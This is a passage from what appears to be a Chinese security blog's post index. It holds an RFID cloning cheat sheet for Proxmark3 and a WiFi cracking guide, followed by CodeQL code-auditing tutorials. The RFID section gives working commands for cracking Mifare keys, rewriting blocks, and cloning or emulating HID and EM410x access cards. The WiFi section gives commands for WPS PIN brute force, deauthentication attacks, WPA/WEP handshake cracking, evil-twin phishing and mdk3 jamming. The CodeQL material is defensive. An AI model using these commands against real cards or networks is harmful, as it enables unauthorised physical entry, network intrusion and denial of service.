6eea41e0 5cadf439 e709c8a\n\n\n成功提取有效密钥后，使用HardNested攻击破击其他密钥\n\nhf mf hardnested [known_key_block] [known_key_type] [known_key] [target_block] [target_key_type]hf mf hardnested 0 A key 0 B# &lt;block number&gt; &lt;key A|B&gt; &lt;key (12 hex symbols)&gt;# &lt;target block number&gt; &lt;target key A|B&gt; [known target key (12 hex symbols)] [w] [s]# w: Acquire nonces and write them to binary file nonces.binhf mf hardnested 0 A 8829da9daf76 4 A w\n\n\n\n修改卡数据All of a sudden we have a new key: 080808080808. This key allows us to read our secret blocks:\nproxmark3&gt; hf mf rdbl 5 A 080808080808#写入区块内容hf mf wrbl 5 A 080808080808 32110000cdeeffff3211000005fa05fa \n\nOnce you have all the keys that you need:\nRead the data from a particular block: hf mf rdbl [block] [A&#x2F;B] [key]\nRead all the data for a particular sector: hf mf rdsc [sector] [A&#x2F;B] [key]\nWrite a specific block with your own data: hf mf wrbl [block_num] [key_type] [key] [block data]\n模拟卡片重放RFID信号\nhttps://www.offensive-security.com/offsec/cloning-rfid-tags-with-proxmark-3/\nhttps://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html\n### EM410X TAGSProxmark&gt; lf readProxmark&gt; lf em4x em410xreadEM410x Tag ID: 23004d4deeProxmark&gt; lf em4x em410xsim 23004d4dee   #当Proxmark读取了标签后，便可以尝试重播它#使用PM3模拟Marefare门禁卡：proxmark3&gt; hf mf sim uid:N/A, numreads:0, flags:0 (0x00)           #db# 4B UID: 2CF0550B              Proxmark&gt; hf mf eload 54CDBDD1Proxmark&gt; hf mf sim u 54CDBDD1# Indalalf indala readlf indala demodlf indala sim a0000000c2c436c1lf indala clone a0000000c2c436c1\n\n\n\n其他修改卡UIDCracking Mifare Classic 1K Cards https://www.youtube.com/watch?v=GqHaZicizvg\nproxmark3&gt; hf searchproxmark3&gt; hf searchproxmark3&gt; hf mf csetuid 798BBB39 0004 08proxmark3&gt; hf mf csetuid ba2ea6ab\n\n\n\n\n\nHID卡 Hackingproxmark3&gt; lf search  HID Prox TAG ID: 2004263f88 (8132) ...proxmark3&gt; lf hid fskdemodproxmark3&gt; lf hid clone 2004263f88  Cloning tag with ID 2004263f88  #db# DONE!\n\n\n\nhex2dumpkeys.pl\nmy $v = &lt;&lt;EOF;  |000|  a0a0a0a0a0a0  | 1 |  b0b0b0b0b0b0  | 1 |            |001|  a0a0a0a0a0a0  | 1 |  b0b0b0b0b0b0  | 1 |  ...            |015|  a0a0a0a0a0a0  | 1 |  b0b0b0b0b0b0  | 1 |    EOFmy @a;while ($v =~ /.*?([0-9a-f]&#123;12&#125;)/is) &#123; push @a, $1; $v = $&#x27;; &#125;open FH, &quot;&gt;dumpkeys.bin&quot;;binmode FH;foreach my $odd (0,1) &#123;  for (my $i=$odd;$i&lt;=$#a;$i+=2) &#123;    my $s = $a[$i];    while (length($s)) &#123;      print FH pack(&#x27;C&#x27;, oct(&#x27;0x&#x27;.substr($s,0,2)));      $s = substr($s, 2);    &#125;  &#125;&#125;close FH;\n\n\n\n\n\n常见卡指纹# MIFARE Classic卡TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1 Valid ISO14443A Tag Found - Quiting Search#HID ProxCardHID Prox TAG ID: 2004263f88 (8132) - Format Len: 26bit - FC: 19 - Card: 8132  Valid HID Prox ID Found!# EM410x Valid EM410x ID Found! \n\n\n\n有了标签ID，我们现在需要一张空白的RFID卡，可以将标签ID克隆到其中。最好的卡是T5577，它可以模拟各种低频卡，包括此处讨论的两种卡（HID ProxCard，EM41000）\n远程克隆读取RFIDsteal RFID tags from multiple feet away\n参考\nhttps://tagbase.ksec.co.uk/tutorials/mifare1k-crack-dupe-dump/\n\nhttps://www.gavinjl.me/proxmark-3-cloning-a-mifare-classic-1k/\n\nhttps://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html\n\n\n","categories":["Wireless"],"tags":["NFC"]},{"title":"WiFi Cracking","url":"/2020/01/wifi-cracking/","content":"网卡模式无线网卡开启监听模式\nifconfig wlan0 downiwconfig wlan0 mode monitorifconfig wlan0 up# airmon-ng会自动把网卡切换到监听模式airmon-ng start wlan0   =&gt;   wlan0mon#如果不成功，试试：airmon-ng check killairmon-ng start wlan0#附：有线网卡开启混杂模式ifconfig eth0 promisc　#设置网卡为混杂模式ifconfig eth0 -promisc #从混杂模式中恢复\n\n 从监听模式中恢复\nifconfig wlan0 downiwconfig wlan0 mode managedifconfig wlan0 up\n\n重启网卡\nservice network-manager restart/etc/init.d/network-manager restartsudo systemctl restart NetworkManagerservice networking restart\n\n\n\n保护措施# 伪装MAC地址macchanger -s  [网卡]   　　　　　　　　　　#查看网卡当前的MACmacchanger -m 想伪造的MAC地址 网卡    　　　#伪造MAC地址macchanger -A  wlan0            　　　　 #修改网卡mac地址为随机地址#修改主机名vi /etc/hostname  #本机防pingecho 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all  \n\n拓展坞飞利浦macbook type-c扩展坞 八合一京东https://item.m.jd.com/product/41639596994.html?wxa_abtest=a&amp;gx=RnFlkTRQPmGKydRP--txW6oz50_h_tjGa2Z0&amp;ad_od=share&amp;utm_source=androidapp&amp;utm_medium=appshare&amp;utm_campaign=t_335139774&amp;utm_term=Wxfriends八合一2993\nWifi破解WPS破解(Pin码)1、无线网卡开启监听模式\n2、扫描开启wps功能的无线AP\nwash -i wlan0\n\n这里需要强调一下，网上很多教程里都有-C这个优化参数，当初写这篇博文的时候也有这个参数，不过新版本的wash已经不再支持，感谢Demon先生的友情提醒。\n3、破解ping码\nreaver -i 混杂网卡名 -c 信道 -b AP&#x27;MAC -a -S -vv -d 9 -t 9 (混杂模式使用)目标信号很好: reaver -i wlan0 -b MAC -a -S -vv -d0 -c 1目标信号普通: reaver -i wlan0 -b MAC -a -S -vv -d2 -t 5 -c 1目标信号一般: reaver -i wlan0 -b MAC -a -S -vv -d5 -c 1\n\n4、成功破解出PIN码后，通过PIN码直接获取路由器密码\nreaver -i 混杂网卡名 -b MAC -p PIN码\n\n\n\n密码字典爆破WPA&#x2F;WPA2\nAircrack-ng1、无线网卡开启混杂监听模式\n2、扫描WiFi网络\nairodump-ng wlan0mon\n\n3、启动监听等待抓取握手包\nairodump-ng -c 信道 -w 保存的数据包名 [–-bssid AP’MAC] wlan0mon#Eg:airodump-ng -c 6 --bssid 69:71:5E:51:38:EE -w /home/ssooking/wifi/FAST_33687 wlan0mon\n\n4、解除客户端认证抓取握手包\naireplay-ng  -0 攻击次数 -a AP’MAC  [-c 客户端MAC]  [-e bssid]  wlan0mon [--ignore-negative-one# Eg:aireplay-ng -0 10 -a 69:71:5E:51:38:EE -c 78:AF:8E:7D:8A:9D wlan0mon# 如果扫描的信道有-1，则需要--ignore-negative-one参数aireplay-ng -0 10 -a 69:71:5E:51:38:EE -c 78:AF:8E:7D:8A:9D wlan0mon --ignore-negative-one# 在没有客户端连接的情况下，可使用假身份认证攻击(模拟用户认证连接，攻击这个模拟用户)aireplay-ng  --fakeauth  -q 10  -a AP&#x27;MAC  -h 模拟用户的MACaireplay-ng  --arpreplay  -b AP&#x27;MAC  -h  模拟用户的MACs\n\n5、使用aircrack-ng加载字典破解密码\naircrack-ng 数据包名.cap –w 字典路径airdecap-ng -l -e bssid –p 密码数据包名.cap #破解出密码后，解析加密内容wpaclean out.cap in.cap　　　　　　 　　　　　　//整理包文件内容，保证它的格式内容与密码破解程序兼容aircrack-ng out.cap -J out.hccap  　　　　　　//要把cap数据包转换成hccap数据包才能用oclHashcat破解cudaHashcat-plus64.exe -m 2500 out.hccap  　//破解WPAv2哈希\n\n\n\n数据包处理\n# airgraph-ng  airgraph-ng -i filename.csv -g CAPR -o outputfilename.png  eog outputfilename.png  airgraph-ng -i filename.csv -g CPG -o outputfilename.png  eog outputfilename.png# airdecap-ng  airdecap-ng -b (vic ap) outputfilename.cap  wireshark outputfilename.cap  airdecap-ng -w (WEP KEY) (capturefile.cap)  wireshark capturefile-DEC.cap  airdecap-ng -e (ESSID VIC) -p (WPA PASSWORD) (capturefile.cap)  wireshark capturefile-dec.cap\n\n\n\nWEP\n1、无线网卡开启混杂监听模式\n2、扫描WiFi网络\nairodump-ng wlan0mon\n\n3、启动监听等待抓取ivs数据包\nairodump-ng  -c 信道 -w 保存的数据包名 [–-bssid AP’MAC] --ivs wlan0mon#Eg:airodump-ng -c 6 --bssid 69:71:5E:51:38:EE -w /home/ssooking/wifi/FAST_33687 wlan0mon\n\n4、解除客户端认证抓取ivs数据包\naireplay-ng -3 -b AP’MAC -h 客户端MAC  [-x 1024(每秒发包数量)] wlan0mon0\n\n注意：为了便于破解密码，所需的ivs数量建议20000以上\n5、使用aircrack-ng加载字典破解密码\naircrack-ng 数据包名.ivs –w 字典路径 aircrack-ng -x -f 2 包名.ivs -x 暴力破解  \t\t#-f 2 复杂度为2\n\n\n\nairdecap-ng  –w 解密前的秘钥 数据包名.ivs如：KEY FOUND! [31:32:33:34:35:36:37:38:39:30:61:61:61] (ASCII:1234560aaa) //蓝色部分是解密前的密钥wesside –v AP’MAC –k 1(重发数据包次数) –i mon0    //aircrack-ng套件中的自动化破解weo加密wifi工具,但成功率较低tkiptun-ng  –a AP’MAC  -h 客户端MAC  网卡  　　//aircrack-ng套件中的自动化破解wpa/wpa2加密wifi的工具(可加参数:-m 最小数据包长度  -n 最大数据包长度)辅助命令airdecloack-ng  --bssid AP’MAC  --filters signal –i 包名.cap #过滤出指定AP报文数据(会生成*.pcap的报文)ivstools  --convert  a.cap  b.ivs    //将cap数据包转换成ivs数据包ivstools  --merge  a.ivs  b.ivs  ab.ivs     //将数据包过滤合并\n\n\n\n其他破解工具握手包破解命令 john --wordlist=password.lst --rules --stdout | aircrack-ng -e essid -w - xxx.cap 使用john在字典上执行排列匹配，将各种组合词提供给aircrack-ng破解使用 pyrit -r xxx.cap -i password.lst attack_passthrough GPU加速破解 (time 程序/命令名 #计算程序执行时间) cowpatty -s ESSID -r xxx.cap -d /path/彩虹表路径 （若SSID中包含空格，要用引号） 为cowpatty破解制作专用hash tables : 　　genpmk -f 字典 -d 要生成的hash table -s ssid 很多组织都自己建立了wpa table库，也就是预先使用常见的essid生成hash table如果要破解essid相同的无线密码，直接网上下载,无需自己再生成国内比较有名的就是ZerOne团队针对国内常见essid生成的hash table现在有很多调用aircrack-ng套件自动化抓包破解的项目，可以去github上瞧瞧。\n\n在线破解握手包的站点 https://gpuhash.me/\nwifitewifite是一个命令行自动化WiFi破解工具，它会根据目标路由器，自动选择合适的破解方式，比如PIN码破解，抓包暴力破解等。\n1、无线网卡开启监听模式\n2、启动wifite\nsudo wifite\n\n\n\n钓鱼欺骗获取密码通过构建钓鱼WiFi，攻击正常客户端迫使其下线，连接恶意AP，欺骗目标用户舒服密码。\nWiFi DOSaireplay-ng -0 3 –a BSSID –c clientMAC wlan0 mdk3 mon0 a –a AP&#x27;MAC -s 80mdk3 mon0 d -c 信道  #攻击client MACmdk3 mon0 b –g –c 11 –h 7  　　　 #发动虚假AP信号进行干扰mdk3 mon0 b –n ESSID –g –c 11　　#对指定名称(ESSID)发送干扰，-g是伪装为54M的标准的802.11无线网络，-c频道\n\n\n","categories":["Wireless"],"tags":["WiFi"]},{"title":"CodeQL入门","url":"/2021/11/codeql%E5%85%A5%E9%97%A8/","content":"什么是CodeQL\n自动化代码分析工具\n\n基于AST语法树构建关系型数据库（CodeDB），包含所有变量定义、函数调用、条件判断等；\n\n依赖查询规则筛选出符合条件的调用链路\n\n默认提供一些规则，但无法满足丰富多样的场景（需要开发者自定义）\n\n\nCodeQL漏洞挖掘实战 - 兔比妙妙屋\nCodeQL的查询需要建立在一个数据库的基础之上，这个数据库是通过Extractor模块对源代码进行分析、提取后得到的。\n数据库建立之后，我们可以使用CodeQL执行QL查询去分析源码，发现代码中的一些已知问题。QL是⼀种查询语⾔，⽀持对 C++，C#，Java，JavaScript，Python，go等多种语言进行分析，可用于分析代码，查找代码中控制流等信息。\n对于编译型语言，CodeQL会在建立数据库时模拟编译过程，在make等编译工具链调用gcc等编译器时，用相同的编译参数调用extractor模块取而代之，收集源代码的所有相关信息，如AST抽象语法树、函数变量类型、预处理器操作等等。对于解释型语言，因为没有编译器的存在，CodeQL会以跟踪执行的方式获取类似的信息。\nCodeQL漏洞追踪思想\n在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。\n\nsource是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。\nsink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。\nsanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。\n\n只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。\ncodeql审计代码原理图\n可以参考绿盟这篇理解：CodeQL漏洞挖掘实战 - 云+社区 - 腾讯云\n\n原理：编写查询语句找出代码中的漏洞，codeql内的编译器调用extractor将java代码编译成可查询的数据流，并以数据库的形式搭配ql库与编写的查询语句进行查询，得出结果并生成报告\n\n官方文档\n\nCodeQL documentation\n\nGetting started with the CodeQL CLI\n\nQL语法入门：Introduction to QL\n\nJAVA QL语法：CodeQL for Java\n\nCodeQL language guides\n\nCodeQL query help for Java\n\n\n相关库\n\nCodeQL Cli：可执行分析程序codeql，能够针对代码创建数据库、执行ql对代码进行分析\n\nCodeQL：开源。一系列库和规则集合、以及其他配套工具，我们可以从这里找到一些现成的规则（如Java SQL注入）、也可以二次开发自己的规则集合。 https://github.com/github/codeql.git \n\nGo analysis support for CodeQL\n\nCodeQL for Visual Studio Code： Visual Studio Code插件，利用该插件可以编写和运行ql、查看结果。\n\nvscode-codeql-starter    帮助开发编写ql语法\n\n\n基本安装使用https://anemone.top/whitebox-CodeQL%E5%88%9D%E6%8E%A2/\n下载三个组件，放在code-home目录下\n$ tree -L 1.├── codeql          # codeql引擎，https://github.com/github/codeql-cli-binaries/releases├── codeql-go       # go解析，https://github.com/github/codeql-go/└── codeql-repo     # 规则，https://github.com/github/codeql\n\n示例分析项目\n\nPixi（JavaScript）\n\nOWASP WebGoat（Java）\n\n\n配置codeql-cli和规则mkdir codeql-home &amp;&amp; cd codeql-homegit clone https://github.com/github/codeql.git codeql-repo    //rules directorygit clone https://github.com/github/codeql-go# codeql-cliwget https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zipunzip codeql-osx64.zipmv codeql codeql-cli$ codeql-home &gt; tree -L 1.├── codeql-cli├── codeql-go└── codeql-repo# 添加codeql cli环境变量export PATH=&quot;/Users/ssooking/CodeAuditTool/codeql-home/codeql-cli:$&#123;PATH&#125;&quot;\n\n下载的ql库是codeql代码，有包结构&#x2F;目录结构要求（qlpack.yml定义一个package），才能正常编译、执行。\n白盒扫描codeql analyze命令可以执行单个ql文件、或者指定目录(搜素执行所有ql文件)、和查询suite(.qls)\nQL库集成了许多常见的安全漏洞查询语法（参考：CodeQL query help for Java），可以拿来扫描项目源码。如：java语言的漏洞查询代码目录在qllib&#x2F;java&#x2F;ql&#x2F;src&#x2F;Security&#x2F;CWE，这里新建test.ql\n白盒扫描使用如下命令（执行所有漏洞类查询）\ncodeql database analyze source_database_name qllib/java/ql/src/codeql-suites/java-security-extended.qls --format=csv --output=java-results.csv\n\n构建被测项目数据库我们需要把我们的靶场项目，使用CodeQL引擎转换成CodeQL可以识别的database，这个过程当中，CodeQL引擎把我们的java代码转换成了可识别的AST数据库。\n在生成数据库时，Python和Javascript这种非编译型语言，无需提供编译命令，可以使用–source-root参数指向待分析源代码路径；\n对于编译型语言，CodeQL会尝试使用内置命令去编译，但有时编译环境参数有区别导致无法正常构建项目，此时可以使用–command指定构建命令。\n# 解释型语言codeql database create --language=&lt;language-identifier&gt; --source-root &lt;folder-to-extract&gt; &lt;database&gt;# 编译型语言codeql database create --language=cpp &lt;output-folder&gt;/cpp-database --command=&quot;编译命令&quot;codeql database create jstest --language=javascriptcodeql database create ./databases/Pixi --language=&quot;javascript&quot; --source-root=&quot;./apps/Pixi&quot;cd vuln_projectcodeql database create &lt;source_database_name&gt;  --language=java# Create database foldermkdir databases# Create CodeQL database for JavaScript (interpreted language)codeql database create \\  ./databases/Pixi \\  --language=&quot;javascript&quot; \\  --source-root=&quot;./apps/Pixi&quot;# Another example using Java (compiled language)codeql database create \\  ./databases/WebGoat \\  --language=&quot;java&quot; \\  --command=&quot;mvn clean install --file pom.xml&quot; \\  --source-root=&quot;./apps/WebGoat&quot;\n\n如：webgoat v.8.0.0.M21之后不支持JDK8，需要checkout换分支。\ngit clone https://github.com/WebGoat/WebGoat.git &amp;&amp; cd git checkout tags/v8.0.0.M21codeql database create webgoat_v8 --language=java \\--command=&quot;mvn clean package -f pom.xml -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true&quot;\n\n测试时可以在LGTM.com上下载已生成好的项目数据库进行分析。\n\nLGTM.com已经使用CodeQL分析了很多项目，可以从LGTM.com下载这些项目的databases。\n\n登录LGTM.com。\n\n找到感兴趣的项目并打开Integrations选项卡。\n\n滚动到页面底部的CodeQL databases for local analysis部分。\n\n下载用于目标语言的数据库。\n\n对数据库进行解压。\n\n\n\n执行QL进行分析codeql database analyze source_database_name ~/codeql/java/ql/src/Security/test/test.ql --format=csv --output=java-results.csvcodeql database analyze source_database_name /Users/ssooking/hacktools/CodeAuditTool/codeql-home/codeql-repocodeql-home/javascript/ql/src/Security --format=csv --output=java-results.csvcodeql database analyze \\  --ram=6000 --threads=4 \\  --format=&quot;csv&quot; \\  --output=&quot;./results/xss-reflected.csv&quot; \\  ./databases/Pixi \\  ./queries/javascript/ql/src/Security/CWE-079/ReflectedXss.ql\n\n查询发现的漏洞会输出到java-results.csv文件\n规则编写如果想自己编写QL，可参考：\nCodeQL编写指南：\n\ncodeql&#x2F;ql-style-guide.md at master\n\nWriting CodeQL queries\n\nAbout QL packs\n\n\nVSCode安装codeql插件https://codeql.github.com/docs/codeql-for-visual-studio-code/setting-up-codeql-in-visual-studio-code/\n1.在插件市场安装CodeQL插件\n2.VSCode配置拓展设置\n进入CodeQL拓展设置：@ext:github.vscode-codeql \n将CLi: Executable Path设置为codecli可执行文件codeql执行路径。这里为：/Users/ssooking/CodeAuditTool/codeql-home/codeql-cli-binaries/codeql\n3.下载vscode-codeql-starter到codeql-home中\ngit clone --recursive https://github.com/github/vscode-codeql-starter/\n\n生成数据库文件\n然后打开vscode-codeql-starter,在vscode里面配置添加库文件\n\n添加已分析好的数据库文件\n在VSCode菜单中点击 File &gt; Open Workspace 选择 vscode-codeql-starter.code-workspace 这个文件来打开这个工作区。\n添加已分析好的数据库文件\n从这个链接下载已经分析好的 uboot CodeQL 数据库，然后解压到相应的文件夹。\n使用 VSCode 快捷键 “ctrl+shift+p” 进入命令模式，输入 “codeql choose database” 看到相应的选项后，点击就可以添加上前面解压的 uboot codeql 数据库。\n在前面打开工作区VSCode中使用 File -&gt; Add Folder to Workspace 添加前面机器人新建的项目文件夹到当前工作区。\n在LGTM中导入一个包的步骤:\n在vscode的CodeQL插件中点击Download from LGTM小头像\n\n输入URL例如https://lgtm.com/projects/g/apache/kafka,再选择需要的语言即可。\n\n最快速的开启方法是直接到lgtm网站进行编写查询\n\n\nCodeQL帮助我们进行了语法树和数据流分析，现在只需要专注于查询语句的写法即可。\n代码分析引擎 CodeQL 初体验 - 安全客，安全资讯平台\nAnalyzing your projects\nhttps://github.com/haby0/mark/tree/master/articles/2021\n常见漏洞\nCWE类型参考：\nCWE-79：XSSCWE-89：SQLiCWE-502: 不安全的反序列化CWE-90：LDAP InjectionCWE-113: HTTP响应拆分CWE-129: Improper Validation of Array IndexCWE-134: Use of Externally-Controlled Format StringCWE-22:路径穿越参考：https://cwe.mitre.org/data/definitions/22.htmlCWE-78：OS Command Injection参考：https://cwe.mitre.org/data/definitions/78.html\n\nhttps://www.codetd.com/article/11371192 挖掘分析\ncodeql使用指南_zzzzfeng的博客-程序员宅基地_codeql - 程序员宅基地\njava1、zip slip（zip解压覆盖任意文件）https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-022/ZipSlip.ql2、命令注入https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-078/ExecUnescaped.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-078/ExecTainted.ql3、cookie安全https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-312/CleartextStorageCookie.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-614/InsecureCookie.ql4、XSShttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-079/XSS.ql5、依赖漏洞https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-1104/MavenPomDependsOnBintray.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-829/InsecureDependencyResolution.ql6、反序列化https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-502/UnsafeDeserialization.ql7、http头注入https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-113/NettyResponseSplitting.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-113/ResponseSplitting.ql8、url跳转https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-601/UrlRedirect.ql9、ldap注入https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-090/LdapInjection.ql10、sql注入https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-089/SqlTainted.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-089/SqlUnescaped.ql11、file权限&amp;目录注入https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-732/ReadingFromWorldWritableFile.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-022/TaintedPath.ql12、xml注入https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-611/XXE.ql13、SSL校验https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-297/UnsafeHostnameVerification.ql14、弱加密https://github.com/github/codeql/java/ql/src/Security/CWE/CWE-327/BrokenCryptoAlgorithm.ql15、随机数种子可预测https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-335/PredictableSeed.ql\n\n参考安全客季刊 - 使用 CodeQL 分析闭源 Java 程序\nhttps://spaddex.com/post/codeql/\nhttps://geekmasher.dev/posts/sast/codeql-introduction\nhttps://km.sankuai.com/page/661271467\nhttps://marketplace.visualstudio.com/items?itemName=github.vscode-codeql#cloning-the-codeql-starter-workspace\nCodeQL使用 | angelwhu_blog\n教程\n代码分析平台CodeQL学习手记（十五） - 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com\nCodeql漏洞挖掘\n推推荐mark&#x2F;articles&#x2F;2021 at master · haby0&#x2F;mark · GitHub\ncodeql挖掘React应用的XSS实践 | Image’s blog\nCodeQL进行JAVA代码审计(1) — XXE漏洞的挖掘 https://cloud.tencent.com/developer/article/1621363使用codeql挖掘fastjson利用链  https://xz.aliyun.com/t/7482\nJavaScript 代码分析引擎 CodeQL 初体验 - 云+社区 - 腾讯云\n[Using CodeQL to detect client-side vulnerabilities in web applications](Using CodeQL to detect client-side vulnerabilities in web applications | Raz0r.name)\n","categories":["代码审计"],"tags":["CodeQL"]},{"title":"CodeQL语法","url":"/2022/01/codeql%E8%AF%AD%E6%B3%95/","content":"QL基本语法QL是一种逻辑编程语言，与SQL数据库查询语言类似。它涉及各种逻辑公式，因此会用到常见的逻辑连接词(and、or和not)、量词(forall和exists)以及其他重要的逻辑概念，如谓词等。QL还支持递归和聚合，这使得我们可以通过简单的QL语法来编写复杂的递归查询。\n编写QLql库符合包结构&#x2F;目录结构要求（通过qlpack.yml定义），才能正常编译、执行。执行查询时，CodeQL会扫描qlpack.yml文件，文件中的元数据告诉CodeQL如何编译查询、包依赖于哪些库、以及在哪里可以找到查询套件定义。详细说明可参考About QL packs。\n如果想要创建自己的查询文件，我们必须在文件夹中创建一个qlpack.yml文件。最简单的qlpack.yml内容如下：\nname: java-sec-code-queryversion: 0.0.0libraryPathDependencies: codeql/java-allsuites: my-custom-suites\n\nlibraryPathDependencies：该QL包所依赖的任何QL包的名称作为一个序列。这使pack可以访问依赖项中定义的任何库，数据库架构和查询套件。\n因为我们现在是针对java的查询，添加codeql/java-all即可。\n2.在QL库中创建自定义QL程序\njava语言的漏洞查询代码目录在qllib&#x2F;java&#x2F;ql&#x2F;src&#x2F;Security&#x2F;CWE，我们也可以直接这里新建ql文件，这样就无需创建qlpack.yml\nhttps://github.com/github/vscode-codeql-starter/\n为了方便起见，测试时也可以使用LGTM的在线查询控制台来执行我们的查询,详情可参考：Using the query console。\nhello world编写一个最简单的查询：通过select子句返回字符串hello world。\nimport javaselect &quot;hello world&quot;\n\n\nimport java表示这里查询的代码是java语言；\n\n而select &quot;hello world&quot;表示返回字符串hello world。\n\n\n语法规则from用来定义变量，where是判断规则，select是输出\n定义类&#x2F;方法类\n/** * A class that has `javax.servlet.Servlet` as an ancestor. */class ServletClass extends Class &#123;  ServletClass() &#123; getAnAncestor().hasQualifiedName(&quot;javax.servlet&quot;, &quot;Servlet&quot;) &#125;&#125;\n\n方法\n/** * The interface `javax.servlet.http.HttpServletResponse`. */class HttpServletResponse extends RefType &#123;  HttpServletResponse() &#123; hasQualifiedName(&quot;javax.servlet.http&quot;, &quot;HttpServletResponse&quot;) &#125;&#125;/** * The method `addCookie(Cookie)` declared in `javax.servlet.http.HttpServletResponse`. */class ResponseAddCookieMethod extends Method &#123;  ResponseAddCookieMethod() &#123;    getDeclaringType() instanceof HttpServletResponse and    hasName(&quot;addCookie&quot;)  &#125;&#125;//========================/** The class `java.lang.String`. */class TypeString extends Class &#123;  TypeString() &#123; this.hasQualifiedName(&quot;java.lang&quot;, &quot;String&quot;) &#125;&#125;/** * The method `getHeader(String)` declared in `javax.servlet.http.HttpServletRequest`. */library class HttpServletRequestGetHeaderMethod extends Method &#123;  HttpServletRequestGetHeaderMethod() &#123;    getDeclaringType() instanceof HttpServletRequest and    hasName(&quot;getHeader&quot;) and    getNumberOfParameters() = 1 and    getParameter(0).getType() instanceof TypeString  &#125;&#125;\n\n查询类与方法我们的类库实际上就是AST的对应关系。怎么理解呢？\n\n比如说我们想获得所有的类当中的方法，在AST里面Method代表的就是类当中的方法；\n\n比如说我们想过的所有的方法调用，MethodAccess获取的就是所有的方法调用。\n\n\n我们经常会用到的ql类库大体如下：\n\n\n\n名称\n解释\n\n\n\nMethod\n方法类，Method method表示获取当前项目中所有的方法\n\n\nMethodAccess\n方法调用类，MethodAccess call表示获取当前项目当中的所有方法调用\n\n\nParameter\n参数类，Parameter表示获取当前项目当中所有的参数\n\n\n结合ql语法，我们尝试获取项目当中定义的所有方法：\nimport javafrom Method methodselect method\n\n我们再通过Method类内置的一些方法，把结果过滤一下。比如我们获取名字为getStudent的方法名称。\nimport javafrom Method methodwhere method.hasName(&quot;getStudent&quot;)select method.getName(), method.getDeclaringType()\n\nmethod.getName() 获取的是当前方法的名称\nmethod.getDeclaringType()获取的是当前方法所属class的名称。\n谓词和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数。这个函数，就叫谓词。\n比如上面的案例，我们可以写成如下，获得的结果跟上面是一样的：\nimport javapredicate isStudent(Method method) &#123;exists(|method.hasName(&quot;getStudent&quot;))&#125;from Method methodwhere isStudent(method)select method.getName(), method.getDeclaringType()\n\n语法解释：\n\npredicate 表示当前方法没有返回值。\nexists子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。\n\n查询所有外部输入import javaimport semmle.code.java.dataflow.FlowSourcesfrom RemoteFlowSource rlsselect rls, &quot;t:&quot;+rls.getSourceType()\n\n查询所有外部依赖/** * @name dependency version * @description version with vulnerabilities * @kind problem * @problem.severity error * @precision high * @id java/dependency-version * @tags security *       external/cwe/cwe-113 */import javaimport semmle.code.xml.MavenPompredicate getCompileDependency(PomDependency dependency) &#123;  dependency.getScope() = &quot;compile&quot; or dependency.getScope() = &quot;runtime&quot;&#125;from PomDependency dependencywhere  getCompileDependency(dependency)select dependency,&quot;dependency: &quot; + dependency.getShortCoordinate() + &quot;:&quot;+ dependency.getVersionString()\n\n查询某方法的所有调用/** * @name dependency version * @description version with vulnerabilities * @kind problem * @problem.severity error * @precision high * @id java/dependency-version * @tags security *       external/cwe/cwe-113 */import java/** * The class `com.xiaomi.miui.lockServer.utils. HttpUtils `. */class TypeAbstractRequestMatcherRegistry extends Class &#123;    TypeAbstractRequestMatcherRegistry() &#123;      this.hasQualifiedName(&quot;com.xiaomi.miui.lockServer.utils&quot;,        &quot;HttpUtils&quot;)    &#125;  &#125;/** A call to `HttpUtils. getRemoteUserIP ` method. */class AnyRequestCall extends MethodAccess &#123;    AnyRequestCall() &#123;      getMethod().hasName(&quot;getRemoteUserIP&quot;) and      getMethod().getDeclaringType() instanceof TypeAbstractRequestMatcherRegistry    &#125;  &#125;from Call c, Callable calleewhere callee = c.getCallee() and callee.getAReference() instanceof AnyRequestCallselect c, &quot;t:&quot;+c.getQualifier()+&quot; &quot;+c.getCallee()// //另外一种简便方式// from Call c// where c.getQualifier().toString() = &quot;httpUtils&quot; and c.getCallee().toString() = &quot;getRemoteUserIP&quot;// select c, &quot;t:&quot;+c.getQualifier()+c.getCallee()ency.getVersionString()\n\n获取某方法的调用链/** * @name sectest2 * @description Writing sectest33 * @kind path-problem * 